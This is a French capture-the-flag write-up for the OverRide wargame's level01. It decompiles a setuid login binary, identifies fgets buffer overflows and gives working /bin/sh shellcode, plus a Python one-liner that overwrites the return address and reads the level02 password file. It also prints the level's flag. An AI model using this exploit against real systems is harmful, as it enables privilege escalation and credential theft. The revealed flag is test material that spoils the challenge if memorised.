# OverRide : [level01]

### Observation :
En arrivant sur le level01 on trouve un exécutable nommé level01.\
Quand nous essayons de le lancer cela nous demande un login, puis nous refuse l'acces. \
Regardons donc avec gdb ou un decompilateur.

---

#### Source décompilée:
```c
char a_user_name[100]; // idb

//----- (08048464) --------------------------------------------------------
_BOOL4 verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(a_user_name, "dat_wil", 7u) != 0;
}

//----- (080484A3) --------------------------------------------------------
_BOOL4 __cdecl verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u) != 0;
}

//----- (080484D0) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  _BOOL4 v5; // [esp+5Ch] [ebp-Ch]

  memset(s, 0, sizeof(s));
  v5 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(a_user_name, 256, stdin);
  v5 = verify_user_name();
  if ( v5 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(s, 100, stdin);
    v5 = verify_user_pass(s);
    puts("nope, incorrect password...\n");
  }
  return 1;
}
```

#### Détails du programme:
```bash
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | Notre fonction main nous demande dans un premier temps de lui donner un nom d'utilisateur (stdin de 256 octets) puis appel la fonction `<verify_user_name>`, si le retour est bon il nous demande un password (stdin de 100 octets) puis appel la fonction `<verify_user_pass>`, ensuite dans tout les cas il retourne la chaine `"nope, incorrect password...\n"`.|
| `<verify_user_name>` | Cette fonction vas juste verifier si notre `stdin` est egal à: `"dat_wil"` (uniquement 7 octets, cela ne compare donc pas le `\0`)|
| `<verify_user_pass>` | cette fonction est similaire a `<verify_user_name>` sauf que cette fois si elle compare notre `stdin` à: `"admin"` (uniquement 5 octets, cela ne compare donc pas le `\0`).|


#### Conclusions:
Nous avons un programme qui a potentielement 2 buffer overflow, un pour chaque `stdin`. \
Nous n'avons pas de moyen normal d'acceder a un shell dans le programme donc nous allons devoir injecter un `shellcode`. \


----
Résolution:
----
Nous allons devoir injecter notre `shellcode` ou nous trouvons de la place, par exemple dans le premier `stdin` juste apres la chaine de 7 octets: `"dat_wil"`. \
Nous devons aussi `jump` depuis la valeur de `return` sur notre `shellcode` grace au 2eme overflow de `stdin`. 

Pour se faire:
- Nous allons donc ecrire dans le premier `stdin` la chaine `"dat_wil"` pour passer la premiere condition, puis mettre notre `shellcode` pour acceder au shell plus tard. 
- Ensuite nous devons replir le reste de notre `stdin` avec des octets random (ou metre un \n). 
- Nous allons par la suite trouver l'adresse de retour afin de pouvoir la modifier, pour jump sur notre shellcode qui se trouve à l'adresse du premier `buffer de stdin (+7 pour la chaine de caractere "dat_wil")`.
- En regardans dans gdb on se rend compte que notre adresse de retour se trouve à `+79 octets` en partant de notre second `buffer (stdin)`, c'est la qu'il faut ecrire l'adresse ou se trouve notre `shellcode` pour qu'il soit executer.



#### Injection:
```asm
# SHELLCODE
# La fonction injectée appelle <system> avec '/bin/sh' en paramètre:

0:  6a 0b                   	push   0xb
2:  58                      	pop    eax
3:  31 f6                   	xor    esi,esi
5:  56                      	push   esi
6:  68 2f 2f 73 68          	push   0x68732f2f
b:  68 2f 62 69 6e          	push   0x6e69622f
10: 89 e3                   	mov    ebx,esp
12: 31 c9                   	xor    ecx,ecx
14: 89 ca                   	mov    edx,ecx
16: cd 80                   	int    0x80
```
#### Commande:
```bash
(python -c "print ('dat_wil\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a' * (256 - 24 - 7) + 'b'*(79) + '\x08\x04\xa0\x47'[::-1])"; ec
ho 'cat /home/users/level02/.pass') | /home/users/level01/level01

```

**Flag :** PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
